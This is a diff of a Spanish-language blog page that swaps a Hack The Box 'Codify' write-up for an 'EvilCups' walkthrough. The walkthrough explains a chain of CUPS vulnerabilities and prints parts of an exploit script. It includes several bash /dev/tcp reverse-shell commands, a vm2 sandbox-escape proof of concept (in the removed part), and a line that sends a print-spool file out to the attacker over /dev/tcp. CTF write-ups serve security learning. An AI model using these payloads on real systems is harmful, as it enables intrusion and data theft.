@@ -8,14 +8,14 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <meta http-equiv="X-UA-Compatible" content="ie=edge" />
   
-  <title>Codify &middot; Loaxert</title>
-  <meta name="title" content="Codify &middot; Loaxert" />
+  <title>EvilCups &middot; Loaxert</title>
+  <meta name="title" content="EvilCups &middot; Loaxert" />
   
   
-  <meta name="keywords" content="python, sudoers, linux, pspy, vm2, sqlite3, nodejs, " />
+  <meta name="keywords" content="CVE-2024-47076, CVE-2024-47175, CVE-2024-47176, CVE-2024-47177, linux, RCE, UDP, " />
   
   
-  <link rel="canonical" href="http://localhost:1313/htb/maquinas/codify/" />
+  <link rel="canonical" href="http://localhost:1313/htb/maquinas/evilcups/" />
   
   
   
@@ -70,26 +70,26 @@
   
   
   
-  <meta property="og:url" content="http://localhost:1313/htb/maquinas/codify/">
+  <meta property="og:url" content="http://localhost:1313/htb/maquinas/evilcups/">
   <meta property="og:site_name" content="Loaxert">
-  <meta property="og:title" content="Codify">
-  <meta property="og:description" content="Descripción: # Maquina muy entretenida que nos enseña a explotar una vulnerabilidad en la libreria vm2 para luego mediante una base de datos conseguir la flag de usuario para escalar privilegios mediante un permiso de sudoers que por una mala configuracion nos permite listar la contraseña de root.">
+  <meta property="og:title" content="EvilCups">
+  <meta property="og:description" content="Descripción: # Maquina que nos pide explotar un CVE de el servicio CUPS donde podemos obtener una shell, el escalamiento es simplemente leer la documentación del servicio y leer un archivo descubriendo su nombre">
   <meta property="og:locale" content="es">
   <meta property="og:type" content="article">
     <meta property="article:section" content="htb">
-    <meta property="article:published_time" content="2025-03-07T00:04:43-05:00">
-    <meta property="article:modified_time" content="2025-03-07T00:04:43-05:00">
-    <meta property="article:tag" content="Python">
-    <meta property="article:tag" content="Sudoers">
+    <meta property="article:published_time" content="2025-03-11T17:00:00-05:00">
+    <meta property="article:modified_time" content="2025-03-11T17:00:00-05:00">
+    <meta property="article:tag" content="CVE-2024-47076">
+    <meta property="article:tag" content="CVE-2024-47175">
+    <meta property="article:tag" content="CVE-2024-47176">
+    <meta property="article:tag" content="CVE-2024-47177">
     <meta property="article:tag" content="Linux">
-    <meta property="article:tag" content="Pspy">
-    <meta property="article:tag" content="Vm2">
-    <meta property="article:tag" content="Sqlite3">
+    <meta property="article:tag" content="RCE">
 
   
   <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="Codify">
-  <meta name="twitter:description" content="Descripción: # Maquina muy entretenida que nos enseña a explotar una vulnerabilidad en la libreria vm2 para luego mediante una base de datos conseguir la flag de usuario para escalar privilegios mediante un permiso de sudoers que por una mala configuracion nos permite listar la contraseña de root.">
+  <meta name="twitter:title" content="EvilCups">
+  <meta name="twitter:description" content="Descripción: # Maquina que nos pide explotar un CVE de el servicio CUPS donde podemos obtener una shell, el escalamiento es simplemente leer la documentación del servicio y leer un archivo descubriendo su nombre">
 
   
   <script type="application/ld+json">
@@ -97,26 +97,26 @@
     "@context": "https://schema.org",
     "@type": "Article",
     "articleSection": "Hack The Box",
-    "name": "Codify",
-    "headline": "Codify",
+    "name": "EvilCups",
+    "headline": "EvilCups",
     
-    "abstract": "Descripción: # Maquina muy entretenida que nos enseña a explotar una vulnerabilidad en la libreria vm2 para luego mediante una base de datos conseguir la flag de usuario para escalar privilegios mediante un permiso de sudoers que por una mala configuracion nos permite listar la contraseña de root.",
+    "abstract": "Descripción: # Maquina que nos pide explotar un CVE de el servicio CUPS donde podemos obtener una shell, el escalamiento es simplemente leer la documentación del servicio y leer un archivo descubriendo su nombre",
     "inLanguage": "es",
-    "url" : "http:\/\/localhost:1313\/htb\/maquinas\/codify\/",
+    "url" : "http:\/\/localhost:1313\/htb\/maquinas\/evilcups\/",
     "author" : {
       "@type": "Person",
       "name": "Santiago Chavarro"
     },
     "copyrightYear": "2025",
-    "dateCreated": "2025-03-07T00:04:43-05:00",
-    "datePublished": "2025-03-07T00:04:43-05:00",
+    "dateCreated": "2025-03-11T17:00:00-05:00",
+    "datePublished": "2025-03-11T17:00:00-05:00",
     
-    "dateModified": "2025-03-07T00:04:43-05:00",
+    "dateModified": "2025-03-11T17:00:00-05:00",
     
-    "keywords": ["python","sudoers","linux","pspy","vm2","sqlite3","nodejs"],
+    "keywords": ["CVE-2024-47076","CVE-2024-47175","CVE-2024-47176","CVE-2024-47177","linux","RCE","UDP"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "498"
+    "wordCount": "871"
   }]
   </script>
 
@@ -505,7 +505,7 @@
   <header id="single_header" class="mt-5 max-w-prose">
     
     <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
-      Codify
+      EvilCups
     </h1>
     <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
       
@@ -546,7 +546,7 @@
 <div class="flex flex-row flex-wrap items-center">
   
   
-  <time datetime="2025-03-07T00:04:43-05:00">7 marzo 2025</time>
+  <time datetime="2025-03-11T17:00:00-05:00">11 marzo 2025</time>
   
 
   
@@ -683,7 +683,7 @@
     </span>        
     
 </h3>
-<p>Maquina muy entretenida que nos enseña a explotar una vulnerabilidad en la libreria vm2 para luego mediante una base de datos conseguir la flag de usuario para escalar privilegios mediante un permiso de sudoers que por una mala configuracion nos permite listar la contraseña de root.</p>
+<p>Maquina que nos pide explotar un CVE de el servicio CUPS donde podemos obtener una shell, el escalamiento es simplemente leer la documentación del servicio y leer un archivo descubriendo su nombre</p>
 
 
 <h1 class="relative group">Enumeración 
@@ -696,84 +696,147 @@
     </span>        
     
 </h1>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nmap -p- --open -sS --min-rate <span class="m">5000</span> -vvv -n -Pn IP -oG allPorts
-</span></span><span class="line"><span class="cl">nmap -sCV -p22,80,3000 -A -oN target IP
-</span></span></code></pre></div><p><a href="https://imgur.com/nKoR4C8"><img src="https://i.imgur.com/nKoR4C8.png" title="source: imgur.com" /></a></p>
-<p>Si tratamos de usar gobuster no encontraremos ningun subdominio ni subdirectorio interesante por lo que no lo voy a mostrar.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nmap -p- --min-rate <span class="m">5000</span> -Pn -n --open -sS <span class="o">[</span>IP<span class="o">]</span> -oG allPorts
+</span></span><span class="line"><span class="cl">nmap -p22,601 -sVC -A <span class="o">[</span>IP<span class="o">]</span> -oN target
+</span></span></code></pre></div><p><a href="https://imgur.com/3zIfURM"><img src="https://i.imgur.com/3zIfURM.png" title="source: imgur.com" /></a></p>
+<p>Si hacemos una rápida búsqueda de puerto 631 encontraremos que además de mencionar el puerto <code>TCP</code> también mencionan el puerto pero en <a href="https://es.adminsub.net/tcp-udp-port-finder/631" target="_blank"><code>UDP</code></a>, debido a esto vamos a escanear también este protocolo.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -sU -p631 <span class="o">[</span>IP<span class="o">]</span>
+</span></span></code></pre></div><p><a href="https://imgur.com/Nm3UrFv"><img src="https://i.imgur.com/Nm3UrFv.png" title="source: imgur.com" /></a></p>
 
 
-<h2 class="relative group">Puerto 80 
-    <div id="puerto-80" class="anchor"></div>
+<h2 class="relative group">CUPS - TCP 631 
+    <div id="cups---tcp-631" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#puerto-80" aria-label="Ancla">#</a>
+            style="text-decoration-line: none !important;" href="#cups---tcp-631" aria-label="Ancla">#</a>
     </span>        
     
 </h2>
-<p><a href="https://imgur.com/k6NZ39V"><img src="https://i.imgur.com/k6NZ39V.png" title="source: imgur.com" /></a></p>
-<p><a href="https://imgur.com/vlx4cMA"><img src="https://i.imgur.com/vlx4cMA.png" title="source: imgur.com" /></a></p>
-<p>Podemos ver como tenemos la posibilidad de ejecutar comandos <code>node.js</code> usando la libreria vm2 ademas de esto no vamos a encontrar nada más intreresante por lo que vamos a buscar vulnerabilidades de la libreria.</p>
-<p>Encontraremos la siguiente poc para la libreria en github que es la que vamos a estar usando <a href="https://gist.github.com/seongil-wi/2a44e082001b959bfe304b62121fb76d" target="_blank">POC</a>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="kr">const</span> <span class="p">{</span><span class="nx">VM</span><span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;vm2&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">VM</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">code</span> <span class="o">=</span> <span class="sb">`
-</span></span></span><span class="line"><span class="cl"><span class="sb">err = {};
-</span></span></span><span class="line"><span class="cl"><span class="sb">const handler = {
-</span></span></span><span class="line"><span class="cl"><span class="sb">    getPrototypeOf(target) {
-</span></span></span><span class="line"><span class="cl"><span class="sb">        (function stack() {
-</span></span></span><span class="line"><span class="cl"><span class="sb">            new Error().stack;
-</span></span></span><span class="line"><span class="cl"><span class="sb">            stack();
-</span></span></span><span class="line"><span class="cl"><span class="sb">        })();
-</span></span></span><span class="line"><span class="cl"><span class="sb">    }
-</span></span></span><span class="line"><span class="cl"><span class="sb">};
-</span></span></span><span class="line"><span class="cl"><span class="sb">  
-</span></span></span><span class="line"><span class="cl"><span class="sb">const proxiedErr = new Proxy(err, handler);
-</span></span></span><span class="line"><span class="cl"><span class="sb">try {
-</span></span></span><span class="line"><span class="cl"><span class="sb">    throw proxiedErr;
-</span></span></span><span class="line"><span class="cl"><span class="sb">} catch ({constructor: c}) {
-</span></span></span><span class="line"><span class="cl"><span class="sb">    c.constructor(&#39;return process&#39;)().mainModule.require(&#39;child_process&#39;).execSync(&#39;touch pwned&#39;);
-</span></span></span><span class="line"><span class="cl"><span class="sb">}
-</span></span></span><span class="line"><span class="cl"><span class="sb">`</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nx">run</span><span class="p">(</span><span class="nx">code</span><span class="p">));</span>
-</span></span></code></pre></div><p><a href="https://imgur.com/EwJLJfF"><img src="https://i.imgur.com/EwJLJfF.png" title="source: imgur.com" /></a></p>
+<p><a href="https://imgur.com/KCk6bh6"><img src="https://i.imgur.com/KCk6bh6.png" title="source: imgur.com" /></a></p>
+<p>Cups tiene una GUI para ayudar al uso de su servicio.</p>
+<p><a href="https://imgur.com/u7JYm95"><img src="https://i.imgur.com/u7JYm95.png" title="source: imgur.com" /></a></p>
+<p>Podemos ver que hay una impresora instalada en el servicio.</p>
 
 
-<h1 class="relative group">User 
-    <div id="user" class="anchor"></div>
+<h1 class="relative group">Usuario 
+    <div id="usuario" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#user" aria-label="Ancla">#</a>
+            style="text-decoration-line: none !important;" href="#usuario" aria-label="Ancla">#</a>
     </span>        
     
 </h1>
-<p>Ya con esto vamos a poder ejecutar comandos y asi montar una revshell,  nos dirigiremos a la pagina <a href="https://www.revshells.com/" target="_blank">RevShells</a> y en nuestra poc ejecutaremos el siguiente comando:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#Primero ponte en escucha en tu maquina (el siguiente comando)</span>
-</span></span><span class="line"><span class="cl">bash -c <span class="s2">&#34;/bin/bash -i &gt;&amp; /dev/tcp/IP/PUERTO 0&gt;&amp;1&#34;</span> 
-</span></span></code></pre></div><p>Y nos pondremos en escucha con netcat en nuestra maquina local:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -lvnp PUERTO
-</span></span></code></pre></div><p>Ya con esto le pediremos a la pagina que ejecute nuestro codigo.</p>
-<p><a href="https://imgur.com/BgatqgV"><img src="https://i.imgur.com/BgatqgV.png" title="source: imgur.com" /></a></p>
-<p>Listo lo primero es hacer el tratamiento de la <code>tty</code>:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">script /dev/null -c bash
-</span></span><span class="line"><span class="cl">Ctrl + Z
-</span></span><span class="line"><span class="cl">stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
-</span></span><span class="line"><span class="cl">reset xterm
-</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
-</span></span></code></pre></div><p>Ya en esta parte con find podemos encontrar una base de datos:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">find /var/www/ -name *.db 2&gt;/dev/null
-</span></span></code></pre></div><p>Y veremos que hay una base de datos, usando file nos daremos cuenta que es una base de datos <code>sqlite</code>:</p>
-<p><a href="https://imgur.com/oYNhrQB"><img src="https://i.imgur.com/oYNhrQB.png" title="source: imgur.com" /></a></p>
-<p>Con esto podremos ver la base de datos que dentro tiene un hash:</p>
-<p><a href="https://imgur.com/YydnXgR"><img src="https://i.imgur.com/YydnXgR.png" title="source: imgur.com" /></a></p>
-<p>Y con el siguiente comando de hashcat podremos obtener la contraseña para ingresar como <code>joshua</code>:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hashcat hash.txt --wordlist /usr/share/wordlist/rockyou.txt -m <span class="m">3200</span>
+
+
+<h2 class="relative group">CUPS CVE’S 
+    <div id="cups-cves" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#cups-cves" aria-label="Ancla">#</a>
+    </span>        
+    
+</h2>
+<p>Buscando por la versión del servicio vamos a hallar diferentes vulnerabilidades que hay para este:</p>
+<ul>
+<li>CVE-2024-47176 - cups-browsed, el servicio que típicamente escucha en todas las interfaces UDP 631, es el que permite agregar una impresora a una máquina de forma remota. Esta vulnerabilidad permite que cualquier atacante que pueda alcanzar esta máquina active una solicitud &ldquo;Get-Printer-Attributes&rdquo; del Protocolo de Impresión por Internet (IPP) que se envía a una URL controlada por el atacante. Esto se corrigió simplemente deshabilitando cups-browsed ya que no es realmente la mejor manera de obtener esta funcionalidad.</li>
+<li>CVE-2024-47076 - libcupsfilters es responsable de manejar los atributos IPP devueltos de la solicitud. Estos se escriben en un archivo temporal de Descripción de Impresora Postscript (PPD) sin sanitización, permitiendo que se escriban atributos maliciosos.</li>
+<li>CVE-2024-47175 - libppd es responsable de leer un archivo PPD temporal y convertirlo en un objeto de impresora en el sistema. Tampoco realiza sanitización durante la lectura, permitiendo la inyección de datos controlados por el atacante.</li>
+<li>CVE-2024-47177 - Esta vulnerabilidad en cups-filters permite cargar una impresora usando el filtro de impresión foomatic-rip, que es un convertidor universal para transformar datos PostScript o PDF al formato que la impresora puede entender. Ha tenido problemas de inyección de comandos durante mucho tiempo y se ha limitado solo a instalaciones y configuraciones manuales.</li>
+</ul>
+<p>Combinando estas cuatro vulnerabilidades podremos agregar una impresora y ejecutar comandos cuando imprimamos desde esta.</p>
+
+
+<h2 class="relative group">Explotación 
+    <div id="explotaci%C3%B3n" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#explotaci%C3%B3n" aria-label="Ancla">#</a>
+    </span>        
+    
+</h2>
+<p>El creador de la maquina tiene una <a href="https://github.com/IppSec/evil-cups/tree/main" target="_blank">script</a> que nos va a ayudar a resolver esta maquina.</p>
+<p>La función <code>__main__</code> nos da una buena idea de que hace el script:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">%s</span><span class="s2"> &lt;LOCAL_HOST&gt; &lt;TARGET_HOST&gt; &lt;COMMAND&gt;&#34;</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">        <span class="n">quit</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">SERVER_HOST</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">SERVER_PORT</span> <span class="o">=</span> <span class="mi">12345</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">command</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">server</span> <span class="o">=</span> <span class="n">IPPServer</span><span class="p">((</span><span class="n">SERVER_HOST</span><span class="p">,</span> <span class="n">SERVER_PORT</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">                       <span class="n">IPPRequestHandler</span><span class="p">,</span> <span class="n">MaliciousPrinter</span><span class="p">(</span><span class="n">command</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="n">target</span><span class="o">=</span><span class="n">run_server</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">server</span><span class="p">,</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">TARGET_HOST</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">TARGET_PORT</span> <span class="o">=</span> <span class="mi">631</span>
+</span></span><span class="line"><span class="cl">    <span class="n">send_browsed_packet</span><span class="p">(</span><span class="n">TARGET_HOST</span><span class="p">,</span> <span class="n">TARGET_PORT</span><span class="p">,</span> <span class="n">SERVER_HOST</span><span class="p">,</span> <span class="n">SERVER_PORT</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Please wait this normally takes 30 seconds...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">seconds</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="se">\r</span><span class="si">{</span><span class="n">seconds</span><span class="si">}</span><span class="s2"> elapsed&#34;</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">flush</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">seconds</span> <span class="o">+=</span> <span class="mi">1</span>
+</span></span></code></pre></div><p>Al leer el script nos damos cuenta que lo que esta haciendo es montar un servidor <code>ipp</code> y mandarle un paquete, vamos a revisar en donde se vuelve malicioso el paquete que envía ya que todos los atributos son normales menos el ultimo donde hace una inyección pasándole <a href="https://github.com/OpenPrinting/cups-filters/security/advisories/GHSA-p9rh-jxmq-gq47" target="_blank">FoomaticRIPCommandLine</a>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">MaliciousPrinter</span><span class="p">(</span><span class="n">behaviour</span><span class="o">.</span><span class="n">StatelessPrinter</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">command</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">command</span> <span class="o">=</span> <span class="n">command</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">super</span><span class="p">(</span><span class="n">MaliciousPrinter</span><span class="p">,</span> <span class="bp">self</span><span class="p">)</span><span class="o">.</span><span class="fm">__init__</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">printer_list_attributes</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">attr</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># rfc2911 section 4.4</span>
+</span></span><span class="line"><span class="cl">            <span class="p">(</span>   
+</span></span><span class="line"><span class="cl">                <span class="n">SectionEnum</span><span class="o">.</span><span class="n">printer</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="sa">b</span><span class="s1">&#39;printer-uri-supported&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="n">TagEnum</span><span class="o">.</span><span class="n">uri</span>
+</span></span><span class="line"><span class="cl">            <span class="p">):</span> <span class="p">[</span><span class="bp">self</span><span class="o">.</span><span class="n">printer_uri</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">            <span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
+</span></span><span class="line"><span class="cl">            <span class="p">(</span>
+</span></span><span class="line"><span class="cl">                <span class="n">SectionEnum</span><span class="o">.</span><span class="n">printer</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="sa">b</span><span class="s1">&#39;printer-more-info&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="n">TagEnum</span><span class="o">.</span><span class="n">uri</span>
+</span></span><span class="line"><span class="cl">            <span class="p">):</span> <span class="p">[</span><span class="sa">f</span><span class="s1">&#39;&#34;</span><span class="se">\n</span><span class="s1">*FoomaticRIPCommandLine: &#34;</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">command</span><span class="si">}</span><span class="s1">&#34;</span><span class="se">\n</span><span class="s1">*cupsFilter2 : &#34;application/pdf application/vnd.cups-postscript 0 foomatic-rip&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">()],</span>
+</span></span><span class="line"><span class="cl"><span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
 </span></span></code></pre></div>
+
+<h3 class="relative group">Agregar la impresora 
+    <div id="agregar-la-impresora" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#agregar-la-impresora" aria-label="Ancla">#</a>
+    </span>        
+    
+</h3>
+<p>Para esto vamos a ejecutar el script de la siguiente forma:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python evilcups.py 10.10.14.152 10.129.231.157 <span class="s1">&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/IP/4444 0&gt;&amp;1&#34;&#39;</span>
+</span></span></code></pre></div><p>Y si vamos a la pagina http que tiene el servicio a la parte de impresoras tendremos una nueva impresora:</p>
+<p><a href="https://imgur.com/rpyZbhZ"><img src="https://i.imgur.com/rpyZbhZ.png" title="source: imgur.com" /></a></p>
+<p>Listo ahora es el momento de probar si ejecuta comandos:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Nos ponemos en escucha</span>
+</span></span><span class="line"><span class="cl">nc -lvnp <span class="m">4444</span>
+</span></span></code></pre></div><p>En la pagina de la impresora en la sección de mantenimiento podemos imprimir una pagina de prueba con esto conseguiremos la shell y la flag.</p>
+<p>Una mejor shell para enviar seria <strong><code>nohup bash -c &quot;bash -i &gt;&amp; /dev/tcp/IP/4444 0&gt;&amp;1&quot;&amp;</code></strong>, ya que inicia un proceso en segundo plano, para evitar que la shell se pierda cada 5 minutos aproximadamente cuando al impresora se elimina.</p>
+
 
 <h1 class="relative group">Root 
     <div id="root" class="anchor"></div>
@@ -785,17 +848,29 @@
     </span>        
     
 </h1>
-<p><a href="https://imgur.com/GNcDqoF"><img src="https://i.imgur.com/GNcDqoF.png" title="source: imgur.com" /></a></p>
-<p>Enumerando encontramos este script que tenemos permiso de ejecutar como sudo:</p>
-<p><a href="https://imgur.com/AGLmyCR"><img src="https://i.imgur.com/AGLmyCR.png" title="source: imgur.com" /></a></p>
-<p>Si vemos el script esta mal montado por lo que cuando pida la contraseña podemos usar el * y nos dira que es correcto esto debido a que si no usamos dobles comillas para esas variables <code>DB_PASS</code> y <code>USER_PASS</code> podemos usar el * de forma que sin importar cual se la contraseña nos la dara como correcta esto tambien nos habilita la opcion de obtener la contraseña con python. Aquí un ejemplo de porque esto pasa:</p>
-<p><a href="https://imgur.com/WVdk3uj"><img src="https://i.imgur.com/WVdk3uj.png" title="source: imgur.com" /></a></p>
-<p>Para poder interceptar la contraseña vamos a usar <a href="https://www.notion.so/Pspy-1a1094373800803aaa8bcb2094703815?pvs=21" target="_blank">pspy</a> igual que en las anteriores maquinas que lo hemos usado.</p>
-<p><a href="https://imgur.com/gLNcKij"><img src="https://i.imgur.com/gLNcKij.png" title="source: imgur.com" /></a></p>
-<p>Y ahi tenemos la contraseña.</p>
-<blockquote>
-<p>Si tienen curiosiodad de como se hacia mediante el script de python pueden ver esta parte del directo de <a href="https://youtu.be/H7-Jd6HaLbI?t=2129" target="_blank">s4vitar</a>.</p>
-</blockquote>
+<p>Primero hacemos el tratamiento de la <code>tty</code> como acostumbramos:</p>
+<p>Aquí está el tratamiento típico de la TTY:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">script /dev/null -c bash
+</span></span><span class="line"><span class="cl">Ctrl + Z
+</span></span><span class="line"><span class="cl">stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
+</span></span><span class="line"><span class="cl">reset xterm
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+</span></span></code></pre></div><p>Listo después de listar por un rato no encontré nada interesante por lo que me devolví a la web y vi que la impresora que siempre esta presente tenia un trabajo que había realizado así que revisando la documentación nos dimos cuenta que estos trabajos se guardan en <code>/var/spool/cups/</code> y si bien no podemos listar dentro del directorio por medio de la documentación sabemos el nombre del archivo que es <code>d[5 números]-001</code> por lo tanto si ejecutamos el siguiente comando veremos el archivo:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat d00001-001
+</span></span></code></pre></div><p>Entonces vamos a mandarnos este archivo a nuestra maquina para enviar el archivo vamos a usar <code>/dev/tcp</code> podemos hacer:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># En nuestra maquina</span>
+</span></span><span class="line"><span class="cl">nc -lvnp <span class="m">4444</span> &gt; archivo.pdf
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># En la maquina victima</span>
+</span></span><span class="line"><span class="cl">cat d00001-001 &gt; /dev/tcp/TU_IP/4444
+</span></span></code></pre></div><p>De esta forma el archivo se transferirá a nuestra máquina a través de una conexión TCP en el puerto 4444.</p>
+<p>Y si abrimos este pdf en nuestra maquina tendremos la contraseña para root:</p>
+<p><a href="https://imgur.com/WW5jiOB"><img src="https://i.imgur.com/WW5jiOB.png" title="source: imgur.com" /></a></p>
+<p>Si quieres aprender mas sobre el CVE que se exploto tienes estas referencias:</p>
+<ul>
